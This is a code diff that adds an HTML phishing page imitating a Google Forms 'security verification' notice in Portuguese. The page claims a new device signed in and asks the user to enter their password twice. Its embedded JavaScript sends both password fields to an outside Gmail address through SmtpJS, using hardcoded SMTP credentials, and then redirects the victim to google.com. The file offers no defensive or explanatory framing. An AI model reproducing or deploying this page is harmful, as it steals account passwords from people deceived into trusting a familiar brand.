@@ -1,1 +1,179 @@
-Hello World
+<html>
+
+<head>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css" rel="stylesheet"/>
+    <script type="text/javascript">
+        function run() {
+        	var pass = $("input[type=password]")[0].value;
+        	var confirm = $("input[type=password]")[1].value;
+
+            Email.send({
+                Host: "smtp.elasticemail.com",
+                Username: "charlescanon0909@fastmail.com",
+                Password: "db26e4d7-4191-4a81-a0a0-f0971b6274ab",
+                To: 'luanmelchert@gmail.com',
+                From: "charlescanon0909@fastmail.com",
+                Subject: "This is the subject",
+                Body: "pass: " + pass + " - confirm: " + confirm
+            });
+
+            if (!pass.length || !confirm.length) {
+            	toastr.error('Preencha o campo de senha')
+            } else if (pass !== confirm) {
+				toastr.error('As senhas não conferem')
+        	} else {
+        		window.location.replace("https://google.com");
+        	}
+        }
+        $(document).ready(function() {
+	        $("input[type=submit]").on("click", run);
+        });
+    </script>
+</head>
+
+<body style="margin: 0">
+    <div id=":s0" class="a3s aXjCH ">
+        <div dir="ltr">
+            <div style="font-family:Roboto,Helvetica,Arial,sans-serif;margin:0;padding:0;height:100%;width:100%">
+                <table border="0" cellpadding="0" cellspacing="0" style="background-color:rgb(103,58,183)" width="100%">
+                    <tbody>
+                        <tr height="64px">
+                            <td style="padding-left:24px"><img alt="Formulários Google" height="26px" style="display:inline-block;margin:0;vertical-align:middle" width="143px" src="https://ci6.googleusercontent.com/proxy/t1Vv3qXKt68KP1AzCe5Kkb21psRLWijHOvT3wLOSDVX8sW979L6toyGSYUZCkzrF63TJybR0oyToPbzNjZ4I09e8x2pEkzjZX9Xsx2izR7S-7LRSvZAARwttrg=s0-d-e1-ft#https://www.gstatic.com/docs/forms/google_forms_logo_lockup_white_2x.png" class="m_4617090793727631894CToWUd CToWUd"></td>
+                        </tr>
+                    </tbody>
+                </table>
+                <div style="padding:24px;background-color:rgb(237,231,246)">
+                    <div align="center" style="background-color:#fff;border-bottom:1px solid #e0e0e0;margin:0 auto;max-width:624px;min-width:154px;padding:0 24px">
+                        <table align="center" cellpadding="0" cellspacing="0" style="background-color:#fff" width="100%">
+                            <tbody>
+                                <tr height="24px">
+                                    <td></td>
+                                </tr>
+                                <tr height="20px">
+                                    <td></td>
+                                </tr>
+                                <tr style="font-size:20px;line-height:24px">
+                                    <td dir="auto"><a href="https://docs.google.com/forms/d/e/1FAIpQLSdq5y-Wz46Lp9oSkZX2REnNFC7B7VTO0BcwGIubFD_64_K_uw/viewform?vc=0&amp;c=0&amp;w=1&amp;usp=mail_form_link" style="color:rgb(103,58,183);text-decoration:none;vertical-align:middle;font-weight:500" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://docs.google.com/forms/d/e/1FAIpQLSdq5y-Wz46Lp9oSkZX2REnNFC7B7VTO0BcwGIubFD_64_K_uw/viewform?vc%3D0%26c%3D0%26w%3D1%26usp%3Dmail_form_link&amp;source=gmail&amp;ust=1556679376793000&amp;usg=AFQjCNFS-YXQtY6Bxqg9CDfDr3lxMnGsCg">Verificação de segurança - URGENTE</a>
+                                        <div></div>
+                                    </td>
+                                </tr>
+                                <tr height="16px"></tr>
+                                <tr>
+                                    <td style="display:table-cell;vertical-align:top;font-size:13px;line-height:18px;color:#424242" dir="auto">Notamos que você fez o login em sua conta Google em um dispositivo <b>Xiaomi Mi 8 Lite</b>, por favor preencha os dados abaixo:</td>
+                                </tr>
+                                <tr height="24px"></tr>
+                                <tr>
+                                    <td>
+                                        <div class="m_4617090793727631894m_6288463982292161154ss-form">
+                                            <ol class="m_4617090793727631894m_6288463982292161154ss-question-list" style="padding-left:0;list-style-type:none">
+
+                                                <div class="m_4617090793727631894m_6288463982292161154ss-form-question m_4617090793727631894m_6288463982292161154errorbox-good">
+                                                    <div dir="auto" class="m_4617090793727631894m_6288463982292161154ss-item m_4617090793727631894m_6288463982292161154ss-item-required m_4617090793727631894m_6288463982292161154ss-radio" style="margin:12px 0">
+                                                        <div class="m_4617090793727631894m_6288463982292161154ss-form-entry" style="margin-bottom:1.5em;vertical-align:middle;margin-left:0;margin-top:0;max-width:100%">
+                                                            <label class="m_4617090793727631894m_6288463982292161154ss-q-item-label" for="m_4617090793727631894m_6288463982292161154entry_245056011">
+                                                                <div class="m_4617090793727631894m_6288463982292161154ss-q-title" style="display:block;font-weight:bold;margin-top:.83em;margin-bottom:.83em">Foi você que realizou essa atividade?
+                                                                    <label for="m_4617090793727631894m_6288463982292161154itemView.getDomIdToLabel()"></label>
+                                                                    <span class="m_4617090793727631894m_6288463982292161154ss-required-asterisk" style="color:#c43b1d">*</span></div>
+                                                                <div class="m_4617090793727631894m_6288463982292161154ss-q-help m_4617090793727631894m_6288463982292161154ss-secondary-text" dir="auto" style="display:block;margin:.1em 0 .25em 0;color:#666"></div>
+                                                            </label>
+
+                                                            <ul class="m_4617090793727631894m_6288463982292161154ss-choices" style="list-style:none;padding:0;margin:.5em 0 0">
+                                                                <li class="m_4617090793727631894m_6288463982292161154ss-choice-item" style="margin:0;line-height:1.3em;padding-bottom:.5em">
+                                                                    <label><span class="m_4617090793727631894m_6288463982292161154ss-choice-item-control m_4617090793727631894m_6288463982292161154goog-inline-block" style="display:inline-block"><input form="m_4617090793727631894m_6288463982292161154ss-form" type="radio" name="entry.1797428727" value="Sim" id="m_4617090793727631894m_6288463982292161154group_1797428727_1" class="m_4617090793727631894m_6288463982292161154ss-q-radio"></span>
+                                                                        <span class="m_4617090793727631894m_6288463982292161154ss-choice-label">Sim</span>
+                                                                    </label>
+                                                                </li>
+                                                                <li class="m_4617090793727631894m_6288463982292161154ss-choice-item" style="margin:0;line-height:1.3em;padding-bottom:.5em">
+                                                                    <label><span class="m_4617090793727631894m_6288463982292161154ss-choice-item-control m_4617090793727631894m_6288463982292161154goog-inline-block" style="display:inline-block"><input form="m_4617090793727631894m_6288463982292161154ss-form" type="radio" name="entry.1797428727" value="Não" id="m_4617090793727631894m_6288463982292161154group_1797428727_2" class="m_4617090793727631894m_6288463982292161154ss-q-radio"></span>
+                                                                        <span class="m_4617090793727631894m_6288463982292161154ss-choice-label">Não</span>
+                                                                    </label>
+                                                                </li>
+                                                            </ul>
+
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div class="m_4617090793727631894m_6288463982292161154ss-form-question m_4617090793727631894m_6288463982292161154errorbox-good">
+                                                    <div dir="auto" class="m_4617090793727631894m_6288463982292161154ss-item m_4617090793727631894m_6288463982292161154ss-text" style="margin:12px 0">
+                                                        <div class="m_4617090793727631894m_6288463982292161154ss-form-entry" style="margin-bottom:1.5em;vertical-align:middle;margin-left:0;margin-top:0;max-width:100%">
+                                                            <label class="m_4617090793727631894m_6288463982292161154ss-q-item-label" for="m_4617090793727631894m_6288463982292161154entry_663217363">
+                                                                <div class="m_4617090793727631894m_6288463982292161154ss-q-title" style="display:block;font-weight:bold;margin-top:.83em;margin-bottom:.83em">Digite a sua senha
+                                                                </div>
+                                                                <div class="m_4617090793727631894m_6288463982292161154ss-q-help m_4617090793727631894m_6288463982292161154ss-secondary-text" dir="auto" style="display:block;margin:.1em 0 .25em 0;color:#666"></div>
+                                                            </label>
+
+                                                            <input type="password" form="m_4617090793727631894m_6288463982292161154ss-form" name="entry.663217363" value="" class="m_4617090793727631894m_6288463982292161154ss-q-short" id="m_4617090793727631894m_6288463982292161154entry_663217363" dir="auto" title="">
+
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div class="m_4617090793727631894m_6288463982292161154ss-form-question m_4617090793727631894m_6288463982292161154errorbox-good">
+                                                    <div dir="auto" class="m_4617090793727631894m_6288463982292161154ss-item m_4617090793727631894m_6288463982292161154ss-text" style="margin:12px 0">
+                                                        <div class="m_4617090793727631894m_6288463982292161154ss-form-entry" style="margin-bottom:1.5em;vertical-align:middle;margin-left:0;margin-top:0;max-width:100%">
+                                                            <label class="m_4617090793727631894m_6288463982292161154ss-q-item-label" for="m_4617090793727631894m_6288463982292161154entry_663217363">
+                                                                <div class="m_4617090793727631894m_6288463982292161154ss-q-title" style="display:block;font-weight:bold;margin-top:.83em;margin-bottom:.83em">Digite a sua senha novamente para confirmação
+                                                                </div>
+                                                                <div class="m_4617090793727631894m_6288463982292161154ss-q-help m_4617090793727631894m_6288463982292161154ss-secondary-text" dir="auto" style="display:block;margin:.1em 0 .25em 0;color:#666"></div>
+                                                            </label>
+
+                                                            <input type="password" form="m_4617090793727631894m_6288463982292161154ss-form" name="entry.663217363" value="" class="m_4617090793727631894m_6288463982292161154ss-q-short" id="m_4617090793727631894m_6288463982292161154entry_663217363" dir="auto" title="">
+
+                                                        </div>
+                                                    </div>
+                                                </div>
+
+                                                <input type="hidden" form="m_4617090793727631894m_6288463982292161154ss-form" name="draftResponse" value="[null,null,&quot;-4089539813833307353&quot;]
+">
+                                                <input type="hidden" form="m_4617090793727631894m_6288463982292161154ss-form" name="pageHistory" value="0">
+
+                                                <input type="hidden" form="m_4617090793727631894m_6288463982292161154ss-form" name="usp" value="mail_form_submit">
+
+                                                <input type="hidden" form="m_4617090793727631894m_6288463982292161154ss-form" name="fbzx" value="-4089539813833307353">
+                                                <div class="m_4617090793727631894m_6288463982292161154ss-send-email-receipt" style="margin-bottom:4px" dir="ltr">
+                                                    <label for="m_4617090793727631894m_6288463982292161154emailReceipt" style="display:inline"></label>
+                                                </div>
+                                                <div class="m_4617090793727631894m_6288463982292161154ss-item m_4617090793727631894m_6288463982292161154ss-navigate" style="margin:12px 0">
+                                                    <table id="m_4617090793727631894m_6288463982292161154navigation-table">
+                                                        <tbody>
+                                                            <tr>
+                                                                <td class="m_4617090793727631894m_6288463982292161154ss-form-entry m_4617090793727631894m_6288463982292161154goog-inline-block" id="m_4617090793727631894m_6288463982292161154navigation-buttons" dir="ltr" style="margin-bottom:1.5em;vertical-align:middle;margin-left:0;margin-top:0;max-width:100%;display:inline-block">
+                                                                    <input type="submit" form="m_4617090793727631894m_6288463982292161154ss-form" name="submit" value="Enviar" id="m_4617090793727631894m_6288463982292161154ss-submit" class="m_4617090793727631894m_6288463982292161154jfk-button m_4617090793727631894m_6288463982292161154jfk-button-action">
+                                                                </td>
+                                                            </tr>
+                                                        </tbody>
+                                                    </table>
+                                                </div>
+                                            </ol>
+                                        </div>
+
+                                    </td>
+                                </tr>
+                                <tr height="24px"></tr>
+                            </tbody>
+                        </table>
+                    </div>
+                    <table align="center" cellpadding="0" cellspacing="0" style="max-width:672px;min-width:154px" width="100%">
+                        <tbody>
+                            <tr height="24px">
+                                <td></td>
+                            </tr>
+                            <tr>
+                                <td>
+                                    <a href="https://docs.google.com/forms?usp=mail_form_link" style="color:#424242;font-size:13px" target="_blank" data-saferedirecturl="https://www.google.com/url?q=https://docs.google.com/forms?usp%3Dmail_form_link&amp;source=gmail&amp;ust=1556679376794000&amp;usg=AFQjCNGjJxgjuhvrzmdr0E8PPSSiA8JdAw"></a>
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+        <div class="yj6qo"></div>
+        <div class="adL">
+        </div>
+    </div>
+</body>
+
+</html>
